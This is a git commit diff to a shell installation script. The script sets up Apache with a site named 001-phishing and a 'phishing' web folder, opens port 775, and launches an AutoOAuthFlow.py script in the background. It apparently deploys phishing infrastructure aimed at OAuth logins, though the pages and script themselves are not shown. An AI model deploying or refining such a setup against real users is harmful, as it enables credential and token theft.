a6d1542aa640edd9b40c1e49ca52fde08fdfdfb2
rafayahmed317 <85213825+rafayahmed317@users.noreply.github.com>
2024-01-20 12:30:36 +0300

    Update installation.sh

--- installation.sh
+++ installation.sh
@@ -1,11 +1,12 @@
-sudo apt update && sudo apt-get install apache2 python3-pip python
+sudo apt update && sudo apt-get install apache2 python3-pip python3
+sudo apt-get install php
 pip3 install requests watchdog
-cp ./html /var/www/
-cp ./phishing /var/www/
-cp ./000-default.conf /etc/apache2/sites-available
-cp ./001-phishing.conf /etc/apache2/sites-available
+cp -r ./html /var/www/
+cp -r ./phishing /var/www/
+cp ./000-default.conf /etc/apache2/sites-available/
+cp ./001-phishing.conf /etc/apache2/sites-available/
 sudo sed -i '/Listen 80/a Listen 775' /etc/apache2/ports.conf
 a2ensite 000-default
 a2ensite 001-phishing
 sudo systemctl restart apache2
-python3 /var/www/html/AutoOAuthFlow.py
+nohup python3 /var/www/html/AutoOAuthFlow.py
